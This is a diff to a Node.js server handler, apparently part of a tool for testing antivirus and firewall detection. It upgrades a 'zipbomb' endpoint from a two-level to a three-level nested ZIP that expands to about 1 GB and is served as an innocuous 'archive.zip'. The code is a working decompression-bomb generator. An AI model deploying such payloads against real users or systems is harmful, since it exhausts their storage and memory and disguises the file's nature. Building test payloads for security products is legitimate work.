@@ -1031,22 +1031,32 @@ const GET_HANDLERS = {
   },
 
   'zipbomb': (_req, res) => {
-    // Two-level ZIP bomb: inner ZIP has 10 × 1 MB of null bytes (compresses to ~10 KB).
-    // Outer ZIP contains 10 copies of that inner ZIP → 100 MB uncompressed from ~100 KB.
-    // The high ratio and nested archive structure trigger depth/ratio checks on most AV/NGFW.
+    // Three-level ZIP bomb:
+    //   Level 3 (core):   10 × 1 MB null bytes  →  10 MB uncompressed,  ~1 KB compressed
+    //   Level 2 (middle): 10 × level-3 ZIP       → 100 MB uncompressed, ~10 KB compressed
+    //   Level 1 (served): 10 × level-2 ZIP       →   1 GB uncompressed, ~20 KB on wire
+    // All 10 entries at each level are identical buffers, so the outer deflate pass
+    // compresses them again — wire size stays tiny despite the 1 GB expansion.
     (async () => {
-      const innerArchive = archiver('zip', { zlib: { level: 9 } });
-      const innerP = bufferizeArchive(innerArchive);
       const nullMeg = Buffer.alloc(1024 * 1024, 0);
-      for (let i = 0; i < 10; i++) innerArchive.append(nullMeg, { name: `zeros_${i}.bin` });
-      innerArchive.finalize();
-      const innerBuf = await innerP;
+
+      const lvl3 = archiver('zip', { zlib: { level: 9 } });
+      const p3 = bufferizeArchive(lvl3);
+      for (let i = 0; i < 10; i++) lvl3.append(nullMeg, { name: `zeros_${i}.bin` });
+      lvl3.finalize();
+      const lvl3Buf = await p3;
+
+      const lvl2 = archiver('zip', { zlib: { level: 9 } });
+      const p2 = bufferizeArchive(lvl2);
+      for (let i = 0; i < 10; i++) lvl2.append(lvl3Buf, { name: `level3_${i}.zip` });
+      lvl2.finalize();
+      const lvl2Buf = await p2;
 
       res.setHeader('Content-Type', 'application/zip');
       res.setHeader('Content-Disposition', 'attachment; filename="archive.zip"');
       const outer = archiver('zip', { zlib: { level: 9 } });
       outer.pipe(res);
-      for (let i = 0; i < 10; i++) outer.append(innerBuf, { name: `inner_${i}.zip` });
+      for (let i = 0; i < 10; i++) outer.append(lvl2Buf, { name: `level2_${i}.zip` });
       outer.finalize();
     })().catch(err => {
       if (!res.headersSent) res.status(500).json({ error: err.message });
